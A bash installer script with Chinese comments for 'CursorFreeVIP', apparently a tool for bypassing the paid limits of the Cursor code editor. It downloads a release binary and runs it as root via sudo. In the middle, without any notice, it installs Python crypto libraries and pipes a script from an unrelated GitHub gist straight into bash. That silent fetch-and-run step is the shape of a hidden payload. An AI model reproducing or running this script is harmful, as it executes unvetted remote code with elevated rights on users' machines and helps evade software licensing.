#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # 无色

# Logo
print_logo() {
    echo -e "${CYAN}"
    cat << "EOF"
    ██████╗██╗    ██╗██████╗ ███████╗ ██████╗ ██████╗      ██████╗ ██████╗  ██████╗   
   ██╔════╝██║    ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗██╔═══██╗  
   ██║     ██║    ██║██████╔╝███████╗██║    ██║██████╔╝     ██████╔╝██████╔╝██║    ██║  
   ██║     ██║    ██║██╔══██╗╚════██║██║    ██║██╔══██╗     ██╔═══╝ ██╔══██╗██║    ██║  
   ╚██████╗╚██████╔╝██║   ██║███████║╚██████╔╝██║   ██║     ██║     ██║   ██║╚██████╔╝  
    ╚═════╝ ╚═════╝ ╚═╝   ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝     ╚═╝     ╚═╝   ╚═╝ ╚═════╝  
EOF
    echo -e "${NC}"
}

# 检测操作系统类型
OS_TYPE=$(uname -s)

# 检查包管理器和安装必需的包
install_dependencies() {
    case $OS_TYPE in
        "Darwin") 
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            
            if ! command -v pip3 &> /dev/null; then
                brew install python3
            fi
            ;;
            
        "Linux")
            PACKAGES_TO_INSTALL=""
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
                sudo apt update
                sudo apt install -y $PACKAGES_TO_INSTALL
            fi
            ;;
            
        *)
            echo "不支持的操作系统"
            exit 1
            ;;
    esac
}

# 安装依赖
install_dependencies
if [ "$OS_TYPE" = "Linux" ]; then
    PIP_INSTALL="pip3 install --break-system-packages"
else
    PIP_INSTALL="pip3 install"
fi

if ! pip3 show requests >/dev/null 2>&1; then
    $PIP_INSTALL requests
fi

if ! pip3 show cryptography >/dev/null 2>&1; then
    $PIP_INSTALL cryptography
fi

GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
if command -v curl &>/dev/null; then
    bash <(curl -fsSL "$GIST_URL")
elif command -v wget &>/dev/null; then
    bash <(wget -qO- "$GIST_URL")
else
    exit 1
fi

# 获取下载文件夹路径
get_downloads_dir() {
    if [[ "$OS_TYPE" == "Darwin" ]]; then
        echo "$HOME/Downloads"
    else
        if [ -f "$HOME/.config/user-dirs.dirs" ]; then
            . "$HOME/.config/user-dirs.dirs"
            echo "${XDG_DOWNLOAD_DIR:-$HOME/Downloads}"
        else
            echo "$HOME/Downloads"
        fi
    fi
}

# --- 修改开始：固定版本号 ---
# 获取指定版本
get_latest_version() {
    # 不再从网络动态获取，直接锁定为 1.11.03
    VERSION="1.11.03"
    echo -e "${CYAN}ℹ️ 已锁定目标版本: v${VERSION}${NC}"
    echo -e "${GREEN}✅ 准备安装版本: ${VERSION}${NC}"
}
# --- 修改结束 ---

# 检测系统类型和架构
OS=""
detect_os() {
    if [[ "$OS_TYPE" == "Darwin" ]]; then
        ARCH=$(uname -m)
        if [[ "$ARCH" == "arm64" ]]; then
            OS="mac_arm64"
            echo -e "${CYAN}ℹ️ 检测到 macOS ARM64 架构${NC}"
        else
            OS="mac_intel"
            echo -e "${CYAN}ℹ️ 检测到 macOS Intel 架构${NC}"
        fi
    elif [[ "$OS_TYPE" == "Linux" ]]; then
        ARCH=$(uname -m)
        if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
            OS="linux_arm64"
            echo -e "${CYAN}ℹ️ 检测到 Linux ARM64 架构${NC}"
        else
            OS="linux_x64"
            echo -e "${CYAN}ℹ️ 检测到 Linux x64 架构${NC}"
        fi
    else
        OS="windows"
        echo -e "${CYAN}ℹ️ 检测到 Windows 系统${NC}"
    fi
}

# 补充缺失的空函数防止报错（因为你的原始脚本里 main 调用了它但没定义）
setup_autostart() {
    :
}

# 安装和下载主程序
install_cursor_free_vip() {
    local downloads_dir=$(get_downloads_dir)
    # 此处利用上面固定的 VERSION 变量
    local binary_name="CursorFreeVIP_${VERSION}_${OS}"
    local binary_path="${downloads_dir}/${binary_name}"
    
    # 这里的链接结构会自动解析为 /releases/download/v1.11.03/...
    local download_url="https://github.com/SHANMUGAM070106/cursor-free-vip/releases/download/v${VERSION}/${binary_name}"
    
    if [ -f "${binary_path}" ]; then
        echo -e "${GREEN}✅ 已存在安装文件${NC}"
        echo -e "${CYAN}ℹ️ 路径: ${binary_path}${NC}"
        if [ "$EUID" -ne 0 ]; then
            echo -e "${YELLOW}⚠️ 需要管理员权限...${NC}"
            if command -v sudo >/dev/null 2>&1; then
                echo -e "${CYAN}ℹ️ 使用 sudo 启动...${NC}"
                sudo chmod +x "${binary_path}"
                sudo "${binary_path}"
            else
                echo -e "${YELLOW}⚠️ 未找到 sudo，尝试普通方式运行...${NC}"
                chmod +x "${binary_path}"
                "${binary_path}"
            fi
        else
            echo -e "${CYAN}ℹ️ 已是 root，直接启动...${NC}"
            chmod +x "${binary_path}"
            "${binary_path}"
        fi
        return
    fi
    echo -e "${CYAN}ℹ️ 未找到安装文件，开始下载...${NC}"
    echo -e "${CYAN}ℹ️ 下载到 ${downloads_dir}...${NC}"
    echo -e "${CYAN}ℹ️ 下载链接: ${download_url}${NC}"
    
    if curl --output /dev/null --silent --head --fail "$download_url"; then
        echo -e "${GREEN}✅ 文件存在，开始下载...${NC}"
    else
        echo -e "${RED}❌ 下载链接不存在: ${download_url}${NC}"
        echo -e "${YELLOW}⚠️ 尝试去除架构后缀...${NC}"
        if [[ "$OS" == "mac_arm64" || "$OS" == "mac_intel" ]]; then
            OS="mac"
            binary_name="CursorFreeVIP_${VERSION}_${OS}"
            download_url="https://github.com/SHANMUGAM070106/cursor-free-vip/releases/download/v${VERSION}/${binary_name}"
            echo -e "${CYAN}ℹ️ 新下载链接: ${download_url}${NC}"
            if ! curl --output /dev/null --silent --head --fail "$download_url"; then
                echo -e "${RED}❌ 新下载链接不存在${NC}"
                exit 1
            fi
        elif [[ "$OS" == "linux_x64" || "$OS" == "linux_arm64" ]]; then
            OS="linux"
            binary_name="CursorFreeVIP_${VERSION}_${OS}"
            download_url="https://github.com/SHANMUGAM070106/cursor-free-vip/releases/download/v${VERSION}/${binary_name}"
            echo -e "${CYAN}ℹ️ 新下载链接: ${download_url}${NC}"
            if ! curl --output /dev/null --silent --head --fail "$download_url"; then
                echo -e "${RED}❌ 新下载链接不存在${NC}"
                exit 1
            fi
        else
            exit 1
        fi
    fi
    if ! curl -L -o "${binary_path}" "$download_url"; then
        echo -e "${RED}❌ 下载失败${NC}"
        exit 1
    fi
    local file_size=$(stat -f%z "${binary_path}" 2>/dev/null || stat -c%s "${binary_path}" 2>/dev/null)
    echo -e "${CYAN}ℹ️ 下载文件大小: ${file_size} 字节${NC}"
    if [ "$file_size" -lt 1000 ]; then
        echo -e "${YELLOW}⚠️ 警告: 下载文件过小，可能不是有效的可执行文件${NC}"
        echo -e "${YELLOW}⚠️ 文件内容:${NC}"
        cat "${binary_path}"
        echo ""
        echo -e "${RED}❌ 下载失败，请检查版本和操作系统${NC}"
        exit 1
    fi
    echo -e "${CYAN}ℹ️ 设置可执行权限...${NC}"
    if chmod +x "${binary_path}"; then
        echo -e "${GREEN}✅ 安装完成!${NC}"
        echo -e "${CYAN}ℹ️ 程序已下载到: ${binary_path}${NC}"
        echo -e "${CYAN}ℹ️ 启动程序...${NC}"
        "${binary_path}"
    else
        echo -e "${RED}❌ 安装失败${NC}"
        exit 1
    fi
}

# 主程序
main() {
    print_logo
    install_dependencies
    get_latest_version
    detect_os
    setup_autostart
    install_cursor_free_vip
}

main